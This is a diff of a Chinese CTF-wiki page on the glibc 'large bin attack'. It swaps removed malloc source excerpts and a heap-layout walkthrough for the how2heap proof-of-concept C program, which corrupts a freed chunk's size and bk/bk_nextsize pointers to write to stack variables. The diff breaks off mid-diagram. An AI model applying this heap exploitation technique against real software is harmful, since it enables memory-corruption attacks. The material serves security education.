@@ -3516,29 +3516,16 @@
     <ul class="md-nav__list" data-md-scrollfix>
       
         <li class="md-nav__item">
-  <a href="#_1" class="md-nav__link">
-    介绍
+  <a href="#large-bin-attack_1" class="md-nav__link">
+    通过实例学习 large bin attack 的原理
   </a>
   
 </li>
       
         <li class="md-nav__item">
-  <a href="#_2" class="md-nav__link">
-    例子
+  <a href="#large-bin-attack_2" class="md-nav__link">
+    总结  large bin attack 的利用方法
   </a>
-  
-    <nav class="md-nav">
-      <ul class="md-nav__list">
-        
-          <li class="md-nav__item">
-  <a href="#0x1-how2heaplarge_bin_attack" class="md-nav__link">
-    0x1 how2heap：large_bin_attack
-  </a>
-  
-</li>
-        
-      </ul>
-    </nav>
   
 </li>
       
@@ -4615,29 +4602,16 @@
     <ul class="md-nav__list" data-md-scrollfix>
       
         <li class="md-nav__item">
-  <a href="#_1" class="md-nav__link">
-    介绍
+  <a href="#large-bin-attack_1" class="md-nav__link">
+    通过实例学习 large bin attack 的原理
   </a>
   
 </li>
       
         <li class="md-nav__item">
-  <a href="#_2" class="md-nav__link">
-    例子
+  <a href="#large-bin-attack_2" class="md-nav__link">
+    总结  large bin attack 的利用方法
   </a>
-  
-    <nav class="md-nav">
-      <ul class="md-nav__list">
-        
-          <li class="md-nav__item">
-  <a href="#0x1-how2heaplarge_bin_attack" class="md-nav__link">
-    0x1 how2heap：large_bin_attack
-  </a>
-  
-</li>
-        
-      </ul>
-    </nav>
   
 </li>
       
@@ -4668,228 +4642,200 @@
                 
                 <p><a href="../large_bin_attack/">EN</a> | <a href="./">ZH</a></p>
 <h1 id="large-bin-attack">Large Bin Attack<a class="headerlink" href="#large-bin-attack" title="Permanent link">&para;</a></h1>
-<h2 id="_1">介绍<a class="headerlink" href="#_1" title="Permanent link">&para;</a></h2>
-<p>Large Bin Attack 可以用来修改任意地址的值。例如用来修改 global_max_fast 进而做下一步的 fast bin attack。</p>
-<div class="codehilite"><pre><span></span><span class="k">while</span> <span class="p">((</span><span class="n">victim</span> <span class="o">=</span> <span class="n">unsorted_chunks</span> <span class="p">(</span><span class="n">av</span><span class="p">)</span><span class="o">-&gt;</span><span class="n">bk</span><span class="p">)</span> <span class="o">!=</span> <span class="n">unsorted_chunks</span> <span class="p">(</span><span class="n">av</span><span class="p">))</span>
+<p>分配跟 large bin 有关的 chunk，要经过 fastbin，unsorted bin，small bin 的分配，建议在学习 large bin attack 之前搞清楚 fastbin，unsorted bin 分配的流程</p>
+<h2 id="large-bin-attack_1">通过实例学习 large bin attack 的原理<a class="headerlink" href="#large-bin-attack_1" title="Permanent link">&para;</a></h2>
+<p>这里我们拿 how2heap 中的 large bin attack 中的源码来分析</p>
+<div class="codehilite"><pre><span></span><span class="c1">// 主要漏洞在这里</span>
+<span class="cm">/*</span>
+
+<span class="cm">    This technique is taken from</span>
+<span class="cm">    https://dangokyo.me/2018/04/07/a-revisit-to-large-bin-in-glibc/</span>
+
+<span class="cm">    [...]</span>
+
+<span class="cm">              else</span>
+<span class="cm">              {</span>
+<span class="cm">                  victim-&gt;fd_nextsize = fwd;</span>
+<span class="cm">                  victim-&gt;bk_nextsize = fwd-&gt;bk_nextsize;</span>
+<span class="cm">                  fwd-&gt;bk_nextsize = victim;</span>
+<span class="cm">                  victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;</span>
+<span class="cm">              }</span>
+<span class="cm">              bck = fwd-&gt;bk;</span>
+
+<span class="cm">    [...]</span>
+
+<span class="cm">    mark_bin (av, victim_index);</span>
+<span class="cm">    victim-&gt;bk = bck;</span>
+<span class="cm">    victim-&gt;fd = fwd;</span>
+<span class="cm">    fwd-&gt;bk = victim;</span>
+<span class="cm">    bck-&gt;fd = victim;</span>
+
+<span class="cm">    For more details on how large-bins are handled and sorted by ptmalloc,</span>
+<span class="cm">    please check the Background section in the aforementioned link.</span>
+
+<span class="cm">    [...]</span>
+
+<span class="cm"> */</span>
+
+<span class="c1">// gcc large_bin_attack.c -o large_bin_attack -g</span>
+<span class="cp">#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp"></span>
+<span class="cp">#include</span> <span class="cpf">&lt;stdlib.h&gt;</span><span class="cp"></span>
+
+<span class="kt">int</span> <span class="nf">main</span><span class="p">()</span>
 <span class="p">{</span>
-    <span class="n">bck</span> <span class="o">=</span> <span class="n">victim</span><span class="o">-&gt;</span><span class="n">bk</span><span class="p">;</span>
-    <span class="k">if</span> <span class="p">(</span><span class="n">__builtin_expect</span> <span class="p">(</span><span class="n">chunksize_nomask</span> <span class="p">(</span><span class="n">victim</span><span class="p">)</span> <span class="o">&lt;=</span> <span class="mi">2</span> <span class="o">*</span> <span class="n">SIZE_SZ</span><span class="p">,</span> <span class="mi">0</span><span class="p">)</span>
-        <span class="o">||</span> <span class="n">__builtin_expect</span> <span class="p">(</span><span class="n">chunksize_nomask</span> <span class="p">(</span><span class="n">victim</span><span class="p">)</span>
-                   <span class="o">&gt;</span> <span class="n">av</span><span class="o">-&gt;</span><span class="n">system_mem</span><span class="p">,</span> <span class="mi">0</span><span class="p">))</span>
-            <span class="n">malloc_printerr</span> <span class="p">(</span><span class="n">check_action</span><span class="p">,</span> <span class="s">&quot;malloc(): memory corruption&quot;</span><span class="p">,</span>
-                             <span class="n">chunk2mem</span> <span class="p">(</span><span class="n">victim</span><span class="p">),</span> <span class="n">av</span><span class="p">);</span>
-    <span class="n">size</span> <span class="o">=</span> <span class="n">chunksize</span> <span class="p">(</span><span class="n">victim</span><span class="p">);</span>
+    <span class="n">fprintf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span> <span class="s">&quot;This file demonstrates large bin attack by writing a large unsigned long value into stack</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
+    <span class="n">fprintf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span> <span class="s">&quot;In practice, large bin attack is generally prepared for further attacks, such as rewriting the &quot;</span>
+                    <span class="s">&quot;global variable global_max_fast in libc for further fastbin attack</span><span class="se">\n\n</span><span class="s">&quot;</span><span class="p">);</span>
 
-    <span class="cm">/*</span>
-<span class="cm">      If a small request, try to use last remainder if it is the</span>
-<span class="cm">      only chunk in unsorted bin.  This helps promote locality for</span>
-<span class="cm">      runs of consecutive small requests. This is the only</span>
-<span class="cm">      exception to best-fit, and applies only when there is</span>
-<span class="cm">      no exact fit for a small chunk.</span>
-<span class="cm">    */</span>
+    <span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">stack_var1</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+    <span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">stack_var2</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
 
-    <span class="k">if</span> <span class="p">(</span><span class="n">in_smallbin_range</span> <span class="p">(</span><span class="n">nb</span><span class="p">)</span> <span class="o">&amp;&amp;</span>
-        <span class="n">bck</span> <span class="o">==</span> <span class="n">unsorted_chunks</span> <span class="p">(</span><span class="n">av</span><span class="p">)</span> <span class="o">&amp;&amp;</span>
-        <span class="n">victim</span> <span class="o">==</span> <span class="n">av</span><span class="o">-&gt;</span><span class="n">last_remainder</span> <span class="o">&amp;&amp;</span>
-        <span class="p">(</span><span class="kt">unsigned</span> <span class="kt">long</span><span class="p">)</span> <span class="p">(</span><span class="n">size</span><span class="p">)</span> <span class="o">&gt;</span> <span class="p">(</span><span class="kt">unsigned</span> <span class="kt">long</span><span class="p">)</span> <span class="p">(</span><span class="n">nb</span> <span class="o">+</span> <span class="n">MINSIZE</span><span class="p">))</span>
-    <span class="p">{</span>
-        <span class="cm">/* split and reattach remainder */</span>
-        <span class="n">remainder_size</span> <span class="o">=</span> <span class="n">size</span> <span class="o">-</span> <span class="n">nb</span><span class="p">;</span>
-        <span class="n">remainder</span> <span class="o">=</span> <span class="n">chunk_at_offset</span> <span class="p">(</span><span class="n">victim</span><span class="p">,</span> <span class="n">nb</span><span class="p">);</span>
-        <span class="n">unsorted_chunks</span> <span class="p">(</span><span class="n">av</span><span class="p">)</span><span class="o">-&gt;</span><span class="n">bk</span> <span class="o">=</span> <span class="n">unsorted_chunks</span> <span class="p">(</span><span class="n">av</span><span class="p">)</span><span class="o">-&gt;</span><span class="n">fd</span> <span class="o">=</span> <span class="n">remainder</span><span class="p">;</span>
-        <span class="n">av</span><span class="o">-&gt;</span><span class="n">last_remainder</span> <span class="o">=</span> <span class="n">remainder</span><span class="p">;</span>
-        <span class="n">remainder</span><span class="o">-&gt;</span><span class="n">bk</span> <span class="o">=</span> <span class="n">remainder</span><span class="o">-&gt;</span><span class="n">fd</span> <span class="o">=</span> <span class="n">unsorted_chunks</span> <span class="p">(</span><span class="n">av</span><span class="p">);</span>
-        <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">in_smallbin_range</span> <span class="p">(</span><span class="n">remainder_size</span><span class="p">))</span>
-        <span class="p">{</span>
-            <span class="n">remainder</span><span class="o">-&gt;</span><span class="n">fd_nextsize</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>
-            <span class="n">remainder</span><span class="o">-&gt;</span><span class="n">bk_nextsize</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>
-        <span class="p">}</span>
+    <span class="n">fprintf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span> <span class="s">&quot;Let&#39;s first look at the targets we want to rewrite on stack:</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
+    <span class="n">fprintf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span> <span class="s">&quot;stack_var1 (%p): %ld</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">stack_var1</span><span class="p">,</span> <span class="n">stack_var1</span><span class="p">);</span>
+    <span class="n">fprintf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span> <span class="s">&quot;stack_var2 (%p): %ld</span><span class="se">\n\n</span><span class="s">&quot;</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">stack_var2</span><span class="p">,</span> <span class="n">stack_var2</span><span class="p">);</span>
 
-        <span class="n">set_head</span> <span class="p">(</span><span class="n">victim</span><span class="p">,</span> <span class="n">nb</span> <span class="o">|</span> <span class="n">PREV_INUSE</span> <span class="o">|</span>
-                  <span class="p">(</span><span class="n">av</span> <span class="o">!=</span> <span class="o">&amp;</span><span class="n">main_arena</span> <span class="o">?</span> <span class="nl">NON_MAIN_ARENA</span> <span class="p">:</span> <span class="mi">0</span><span class="p">));</span>
-        <span class="n">set_head</span> <span class="p">(</span><span class="n">remainder</span><span class="p">,</span> <span class="n">remainder_size</span> <span class="o">|</span> <span class="n">PREV_INUSE</span><span class="p">);</span>
-        <span class="n">set_foot</span> <span class="p">(</span><span class="n">remainder</span><span class="p">,</span> <span class="n">remainder_size</span><span class="p">);</span>
+    <span class="kt">unsigned</span> <span class="kt">long</span> <span class="o">*</span><span class="n">p1</span> <span class="o">=</span> <span class="n">malloc</span><span class="p">(</span><span class="mh">0x320</span><span class="p">);</span>
+    <span class="n">fprintf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span> <span class="s">&quot;Now, we allocate the first large chunk on the heap at: %p</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span> <span class="n">p1</span> <span class="o">-</span> <span class="mi">2</span><span class="p">);</span>
 
-        <span class="n">check_malloced_chunk</span> <span class="p">(</span><span class="n">av</span><span class="p">,</span> <span class="n">victim</span><span class="p">,</span> <span class="n">nb</span><span class="p">);</span>
-        <span class="kt">void</span> <span class="o">*</span><span class="n">p</span> <span class="o">=</span> <span class="n">chunk2mem</span> <span class="p">(</span><span class="n">victim</span><span class="p">);</span>
-        <span class="n">alloc_perturb</span> <span class="p">(</span><span class="n">p</span><span class="p">,</span> <span class="n">bytes</span><span class="p">);</span>
-        <span class="k">return</span> <span class="n">p</span><span class="p">;</span>
-    <span class="p">}</span>
+    <span class="n">fprintf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span> <span class="s">&quot;And allocate another fastbin chunk in order to avoid consolidating the next large chunk with&quot;</span>
+                    <span class="s">&quot; the first large chunk during the free()</span><span class="se">\n\n</span><span class="s">&quot;</span><span class="p">);</span>
+    <span class="n">malloc</span><span class="p">(</span><span class="mh">0x20</span><span class="p">);</span>
 
-    <span class="cm">/* remove from unsorted list */</span>
-    <span class="n">unsorted_chunks</span> <span class="p">(</span><span class="n">av</span><span class="p">)</span><span class="o">-&gt;</span><span class="n">bk</span> <span class="o">=</span> <span class="n">bck</span><span class="p">;</span>
-    <span class="n">bck</span><span class="o">-&gt;</span><span class="n">fd</span> <span class="o">=</span> <span class="n">unsorted_chunks</span> <span class="p">(</span><span class="n">av</span><span class="p">);</span>
+    <span class="kt">unsigned</span> <span class="kt">long</span> <span class="o">*</span><span class="n">p2</span> <span class="o">=</span> <span class="n">malloc</span><span class="p">(</span><span class="mh">0x400</span><span class="p">);</span>
+    <span class="n">fprintf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span> <span class="s">&quot;Then, we allocate the second large chunk on the heap at: %p</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span> <span class="n">p2</span> <span class="o">-</span> <span class="mi">2</span><span class="p">);</span>
 
-    <span class="cm">/* Take now instead of binning if exact fit */</span>
+    <span class="n">fprintf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span> <span class="s">&quot;And allocate another fastbin chunk in order to avoid consolidating the next large chunk with&quot;</span>
+                    <span class="s">&quot; the second large chunk during the free()</span><span class="se">\n\n</span><span class="s">&quot;</span><span class="p">);</span>
+    <span class="n">malloc</span><span class="p">(</span><span class="mh">0x20</span><span class="p">);</span>
 
-    <span class="k">if</span> <span class="p">(</span><span class="n">size</span> <span class="o">==</span> <span class="n">nb</span><span class="p">)</span>
-    <span class="p">{</span>
-         <span class="n">set_inuse_bit_at_offset</span> <span class="p">(</span><span class="n">victim</span><span class="p">,</span> <span class="n">size</span><span class="p">);</span>
-         <span class="k">if</span> <span class="p">(</span><span class="n">av</span> <span class="o">!=</span> <span class="o">&amp;</span><span class="n">main_arena</span><span class="p">)</span>
-             <span class="n">set_non_main_arena</span> <span class="p">(</span><span class="n">victim</span><span class="p">);</span>
-         <span class="n">check_malloced_chunk</span> <span class="p">(</span><span class="n">av</span><span class="p">,</span> <span class="n">victim</span><span class="p">,</span> <span class="n">nb</span><span class="p">);</span>
-         <span class="kt">void</span> <span class="o">*</span><span class="n">p</span> <span class="o">=</span> <span class="n">chunk2mem</span> <span class="p">(</span><span class="n">victim</span><span class="p">);</span>
-         <span class="n">alloc_perturb</span> <span class="p">(</span><span class="n">p</span><span class="p">,</span> <span class="n">bytes</span><span class="p">);</span>
-         <span class="k">return</span> <span class="n">p</span><span class="p">;</span>
-    <span class="p">}</span>
+    <span class="kt">unsigned</span> <span class="kt">long</span> <span class="o">*</span><span class="n">p3</span> <span class="o">=</span> <span class="n">malloc</span><span class="p">(</span><span class="mh">0x400</span><span class="p">);</span>
+    <span class="n">fprintf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span> <span class="s">&quot;Finally, we allocate the third large chunk on the heap at: %p</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span> <span class="n">p3</span> <span class="o">-</span> <span class="mi">2</span><span class="p">);</span>
 
-    <span class="cm">/* place chunk in bin */</span>
-    <span class="k">if</span> <span class="p">(</span><span class="n">in_smallbin_range</span> <span class="p">(</span><span class="n">size</span><span class="p">))</span>
-    <span class="p">{</span>
-        <span class="n">victim_index</span> <span class="o">=</span> <span class="n">smallbin_index</span> <span class="p">(</span><span class="n">size</span><span class="p">);</span>
-        <span class="n">bck</span> <span class="o">=</span> <span class="n">bin_at</span> <span class="p">(</span><span class="n">av</span><span class="p">,</span> <span class="n">victim_index</span><span class="p">);</span>
-        <span class="n">fwd</span> <span class="o">=</span> <span class="n">bck</span><span class="o">-&gt;</span><span class="n">fd</span><span class="p">;</span>
-    <span class="p">}</span>
-    <span class="k">else</span>
-    <span class="p">{</span>
-        <span class="n">victim_index</span> <span class="o">=</span> <span class="n">largebin_index</span> <span class="p">(</span><span class="n">size</span><span class="p">);</span>
-        <span class="n">bck</span> <span class="o">=</span> <span class="n">bin_at</span> <span class="p">(</span><span class="n">av</span><span class="p">,</span> <span class="n">victim_index</span><span class="p">);</span>
-        <span class="n">fwd</span> <span class="o">=</span> <span class="n">bck</span><span class="o">-&gt;</span><span class="n">fd</span><span class="p">;</span>
+    <span class="n">fprintf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span> <span class="s">&quot;And allocate another fastbin chunk in order to avoid consolidating the top chunk with&quot;</span>
+                    <span class="s">&quot; the third large chunk during the free()</span><span class="se">\n\n</span><span class="s">&quot;</span><span class="p">);</span>
+    <span class="n">malloc</span><span class="p">(</span><span class="mh">0x20</span><span class="p">);</span>
 
-        <span class="cm">/* maintain large bins in sorted order */</span>
-        <span class="k">if</span> <span class="p">(</span><span class="n">fwd</span> <span class="o">!=</span> <span class="n">bck</span><span class="p">)</span>
-        <span class="p">{</span>
-             <span class="cm">/* Or with inuse bit to speed comparisons */</span>
-             <span class="n">size</span> <span class="o">|=</span> <span class="n">PREV_INUSE</span><span class="p">;</span>
-             <span class="cm">/* if smaller than smallest, bypass loop below */</span>
-             <span class="n">assert</span> <span class="p">(</span><span class="n">chunk_main_arena</span> <span class="p">(</span><span class="n">bck</span><span class="o">-&gt;</span><span class="n">bk</span><span class="p">));</span>
-             <span class="k">if</span> <span class="p">((</span><span class="kt">unsigned</span> <span class="kt">long</span><span class="p">)</span> <span class="p">(</span><span class="n">size</span><span class="p">)</span> <span class="o">&lt;</span> <span class="p">(</span><span class="kt">unsigned</span> <span class="kt">long</span><span class="p">)</span> <span class="n">chunksize_nomask</span> <span class="p">(</span><span class="n">bck</span><span class="o">-&gt;</span><span class="n">bk</span><span class="p">))</span>
-             <span class="p">{</span>
-                 <span class="n">fwd</span> <span class="o">=</span> <span class="n">bck</span><span class="p">;</span>
-                 <span class="n">bck</span> <span class="o">=</span> <span class="n">bck</span><span class="o">-&gt;</span><span class="n">bk</span><span class="p">;</span>
-                 <span class="n">victim</span><span class="o">-&gt;</span><span class="n">fd_nextsize</span> <span class="o">=</span> <span class="n">fwd</span><span class="o">-&gt;</span><span class="n">fd</span><span class="p">;</span>
-                 <span class="n">victim</span><span class="o">-&gt;</span><span class="n">bk_nextsize</span> <span class="o">=</span> <span class="n">fwd</span><span class="o">-&gt;</span><span class="n">fd</span><span class="o">-&gt;</span><span class="n">bk_nextsize</span><span class="p">;</span>
-                 <span class="n">fwd</span><span class="o">-&gt;</span><span class="n">fd</span><span class="o">-&gt;</span><span class="n">bk_nextsize</span> <span class="o">=</span> <span class="n">victim</span><span class="o">-&gt;</span><span class="n">bk_nextsize</span><span class="o">-&gt;</span><span class="n">fd_nextsize</span> <span class="o">=</span> <span class="n">victim</span><span class="p">;</span>
-              <span class="p">}</span>
-              <span class="k">else</span>
-              <span class="p">{</span>
-                  <span class="n">assert</span> <span class="p">(</span><span class="n">chunk_main_arena</span> <span class="p">(</span><span class="n">fwd</span><span class="p">));</span>
-                  <span class="k">while</span> <span class="p">((</span><span class="kt">unsigned</span> <span class="kt">long</span><span class="p">)</span> <span class="n">size</span> <span class="o">&lt;</span> <span class="n">chunksize_nomask</span> <span class="p">(</span><span class="n">fwd</span><span class="p">))</span>
-                  <span class="p">{</span>
-                      <span class="n">fwd</span> <span class="o">=</span> <span class="n">fwd</span><span class="o">-&gt;</span><span class="n">fd_nextsize</span><span class="p">;</span>
-                      <span class="n">assert</span> <span class="p">(</span><span class="n">chunk_main_arena</span> <span class="p">(</span><span class="n">fwd</span><span class="p">));</span>
-                  <span class="p">}</span>
+    <span class="n">free</span><span class="p">(</span><span class="n">p1</span><span class="p">);</span>
+    <span class="n">free</span><span class="p">(</span><span class="n">p2</span><span class="p">);</span>
+    <span class="n">fprintf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span> <span class="s">&quot;We free the first and second large chunks now and they will be inserted in the unsorted bin:&quot;</span>
+                    <span class="s">&quot; [ %p &lt;--&gt; %p ]</span><span class="se">\n\n</span><span class="s">&quot;</span><span class="p">,</span>
+            <span class="p">(</span><span class="kt">void</span> <span class="o">*</span><span class="p">)(</span><span class="n">p2</span> <span class="o">-</span> <span class="mi">2</span><span class="p">),</span> <span class="p">(</span><span class="kt">void</span> <span class="o">*</span><span class="p">)(</span><span class="n">p2</span><span class="p">[</span><span class="mi">0</span><span class="p">]));</span>
 
-                  <span class="k">if</span> <span class="p">((</span><span class="kt">unsigned</span> <span class="kt">long</span><span class="p">)</span> <span class="n">size</span> <span class="o">==</span> <span class="p">(</span><span class="kt">unsigned</span> <span class="kt">long</span><span class="p">)</span> <span class="n">chunksize_nomask</span> <span class="p">(</span><span class="n">fwd</span><span class="p">))</span>
-                        <span class="cm">/* Always insert in the second position.  */</span>
-                        <span class="n">fwd</span> <span class="o">=</span> <span class="n">fwd</span><span class="o">-&gt;</span><span class="n">fd</span><span class="p">;</span>
-                  <span class="k">else</span>
-                  <span class="p">{</span>
-                      <span class="n">victim</span><span class="o">-&gt;</span><span class="n">fd_nextsize</span> <span class="o">=</span> <span class="n">fwd</span><span class="p">;</span>
-                      <span class="n">victim</span><span class="o">-&gt;</span><span class="n">bk_nextsize</span> <span class="o">=</span> <span class="n">fwd</span><span class="o">-&gt;</span><span class="n">bk_nextsize</span><span class="p">;</span>
-                      <span class="n">fwd</span><span class="o">-&gt;</span><span class="n">bk_nextsize</span> <span class="o">=</span> <span class="n">victim</span><span class="p">;</span>
-                      <span class="n">victim</span><span class="o">-&gt;</span><span class="n">bk_nextsize</span><span class="o">-&gt;</span><span class="n">fd_nextsize</span> <span class="o">=</span> <span class="n">victim</span><span class="p">;</span>
-                  <span class="p">}</span>
-                  <span class="n">bck</span> <span class="o">=</span> <span class="n">fwd</span><span class="o">-&gt;</span><span class="n">bk</span><span class="p">;</span>
-              <span class="p">}</span>
-          <span class="p">}</span>
-          <span class="k">else</span>
-              <span class="n">victim</span><span class="o">-&gt;</span><span class="n">fd_nextsize</span> <span class="o">=</span> <span class="n">victim</span><span class="o">-&gt;</span><span class="n">bk_nextsize</span> <span class="o">=</span> <span class="n">victim</span><span class="p">;</span>
-    <span class="p">}</span>
+    <span class="kt">void</span><span class="o">*</span> <span class="n">p4</span> <span class="o">=</span> <span class="n">malloc</span><span class="p">(</span><span class="mh">0x90</span><span class="p">);</span>
+    <span class="n">fprintf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span> <span class="s">&quot;Now, we allocate a chunk with a size smaller than the freed first large chunk. This will move the&quot;</span>
+                    <span class="s">&quot; freed second large chunk into the large bin freelist, use parts of the freed first large chunk for allocation&quot;</span>
+                    <span class="s">&quot;, and reinsert the remaining of the freed first large chunk into the unsorted bin:&quot;</span>
+                    <span class="s">&quot; [ %p ]</span><span class="se">\n\n</span><span class="s">&quot;</span><span class="p">,</span>
+            <span class="p">(</span><span class="kt">void</span> <span class="o">*</span><span class="p">)((</span><span class="kt">char</span> <span class="o">*</span><span class="p">)</span><span class="n">p1</span> <span class="o">+</span> <span class="mh">0x90</span><span class="p">));</span>
 
+    <span class="n">free</span><span class="p">(</span><span class="n">p3</span><span class="p">);</span>
+    <span class="n">fprintf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span> <span class="s">&quot;Now, we free the third large chunk and it will be inserted in the unsorted bin:&quot;</span>
+                    <span class="s">&quot; [ %p &lt;--&gt; %p ]</span><span class="se">\n\n</span><span class="s">&quot;</span><span class="p">,</span>
+            <span class="p">(</span><span class="kt">void</span> <span class="o">*</span><span class="p">)(</span><span class="n">p3</span> <span class="o">-</span> <span class="mi">2</span><span class="p">),</span> <span class="p">(</span><span class="kt">void</span> <span class="o">*</span><span class="p">)(</span><span class="n">p3</span><span class="p">[</span><span class="mi">0</span><span class="p">]));</span>
 
+    <span class="c1">//------------VULNERABILITY-----------</span>
 
-    <span class="n">mark_bin</span> <span class="p">(</span><span class="n">av</span><span class="p">,</span> <span class="n">victim_index</span><span class="p">);</span>
-    <span class="n">victim</span><span class="o">-&gt;</span><span class="n">bk</span> <span class="o">=</span> <span class="n">bck</span><span class="p">;</span>
-    <span class="n">victim</span><span class="o">-&gt;</span><span class="n">fd</span> <span class="o">=</span> <span class="n">fwd</span><span class="p">;</span>
-    <span class="n">fwd</span><span class="o">-&gt;</span><span class="n">bk</span> <span class="o">=</span> <span class="n">victim</span><span class="p">;</span>
-    <span class="n">bck</span><span class="o">-&gt;</span><span class="n">fd</span> <span class="o">=</span> <span class="n">victim</span><span class="p">;</span>
+    <span class="n">fprintf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span> <span class="s">&quot;Now emulating a vulnerability that can overwrite the freed second large chunk&#39;s </span><span class="se">\&quot;</span><span class="s">size</span><span class="se">\&quot;</span><span class="s">&quot;</span>
+                    <span class="s">&quot; as well as its </span><span class="se">\&quot;</span><span class="s">bk</span><span class="se">\&quot;</span><span class="s"> and </span><span class="se">\&quot;</span><span class="s">bk_nextsize</span><span class="se">\&quot;</span><span class="s"> pointers</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
+    <span class="n">fprintf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span> <span class="s">&quot;Basically, we decrease the size of the freed second large chunk to force malloc to insert the freed third large chunk&quot;</span>
+                    <span class="s">&quot; at the head of the large bin freelist. To overwrite the stack variables, we set </span><span class="se">\&quot;</span><span class="s">bk</span><span class="se">\&quot;</span><span class="s"> to 16 bytes before stack_var1 and&quot;</span>
+                    <span class="s">&quot; </span><span class="se">\&quot;</span><span class="s">bk_nextsize</span><span class="se">\&quot;</span><span class="s"> to 32 bytes before stack_var2</span><span class="se">\n\n</span><span class="s">&quot;</span><span class="p">);</span>
 
-<span class="cp">#define MAX_ITERS       10000</span>
-    <span class="k">if</span> <span class="p">(</span><span class="o">++</span><span class="n">iters</span> <span class="o">&gt;=</span> <span class="n">MAX_ITERS</span><span class="p">)</span>
-        <span class="k">break</span><span class="p">;</span>
-<span class="p">}</span>
-</pre></div>
-
-<p>与 largebin相关的代码如上，我们利用的主要核心代码是如下分支：</p>
-<p>当不满足 <code>if ((unsigned long) size == (unsigned long) chunksize_nomask (fwd))</code> 条件的时候</p>
-<div class="codehilite"><pre><span></span>                  <span class="k">if</span> <span class="p">((</span><span class="kt">unsigned</span> <span class="kt">long</span><span class="p">)</span> <span class="n">size</span> <span class="o">==</span> <span class="p">(</span><span class="kt">unsigned</span> <span class="kt">long</span><span class="p">)</span> <span class="n">chunksize_nomask</span> <span class="p">(</span><span class="n">fwd</span><span class="p">))</span>
-                        <span class="cm">/* Always insert in the second position.  */</span>
-                        <span class="n">fwd</span> <span class="o">=</span> <span class="n">fwd</span><span class="o">-&gt;</span><span class="n">fd</span><span class="p">;</span>
-                  <span class="k">else</span>
-                  <span class="p">{</span>
-                      <span class="n">victim</span><span class="o">-&gt;</span><span class="n">fd_nextsize</span> <span class="o">=</span> <span class="n">fwd</span><span class="p">;</span>
-                      <span class="n">victim</span><span class="o">-&gt;</span><span class="n">bk_nextsize</span> <span class="o">=</span> <span class="n">fwd</span><span class="o">-&gt;</span><span class="n">bk_nextsize</span><span class="p">;</span>
-                      <span class="n">fwd</span><span class="o">-&gt;</span><span class="n">bk_nextsize</span> <span class="o">=</span> <span class="n">victim</span><span class="p">;</span>
-                      <span class="n">victim</span><span class="o">-&gt;</span><span class="n">bk_nextsize</span><span class="o">-&gt;</span><span class="n">fd_nextsize</span> <span class="o">=</span> <span class="n">victim</span><span class="p">;</span>
-                  <span class="p">}</span>
-</pre></div>
-
-<h2 id="_2">例子<a class="headerlink" href="#_2" title="Permanent link">&para;</a></h2>
-<h3 id="0x1-how2heaplarge_bin_attack">0x1 how2heap：large_bin_attack<a class="headerlink" href="#0x1-how2heaplarge_bin_attack" title="Permanent link">&para;</a></h3>
-<p>我们构造出如下情景：</p>
-<div class="codehilite"><pre><span></span>PwnLife&gt; parseheap
-addr                prev                size                 status              fd                bk
-0x603000            0x0                 0xa0                 Used                None              None
-0x6030a0            0x0                 0x290                Freed     0x7ffff7dd1b58          0x6037a0
-0x603330            0x290               0x30                 Used                None              None
-0x603360            0x0                 0x410                Freed     0x7ffff7dd1f48    0x7ffff7dd1f48
-0x603770            0x410               0x30                 Used                None              None
-0x6037a0            0x0                 0x410                Freed           0x6030a0    0x7ffff7dd1b58
-0x603bb0            0x410               0x30                 Used                None              None
-</pre></div>
-
-<p>此时 chunk 情景如下：</p>
-<div class="codehilite"><pre><span></span>                  top: 0x603be0 <span class="o">(</span>size : 0x20420<span class="o">)</span>
-       last_remainder: 0x6030a0 <span class="o">(</span>size : 0x290<span class="o">)</span>
-            unsortbin: 0x6037a0 <span class="o">(</span>size : 0x410<span class="o">)</span> &lt;--&gt; 0x6030a0 <span class="o">(</span>size : 0x290<span class="o">)</span>
-         largebin<span class="o">[</span> <span class="m">0</span><span class="o">]</span>: 0x603360 <span class="o">(</span>size : 0x410<span class="o">)</span>
-</pre></div>
-
-<p>unsortbin :</p>
-<div class="codehilite"><pre><span></span>+----------------------------------------+
-<span class="p">|</span>                                        <span class="p">|</span>
-<span class="p">|</span>                                        <span class="p">|</span>
-<span class="p">|</span>               +-------------+          <span class="p">|</span>
-<span class="p">|</span>               <span class="p">|</span>             <span class="p">|</span>          v
-<span class="p">|</span>      P3       v             <span class="p">|</span>    P1
-<span class="p">|</span>         +-----+------+      <span class="p">|</span>     +------------+
-<span class="p">|</span>         <span class="p">|</span>            <span class="p">|</span>      <span class="p">|</span>     <span class="p">|</span>            <span class="p">|</span>
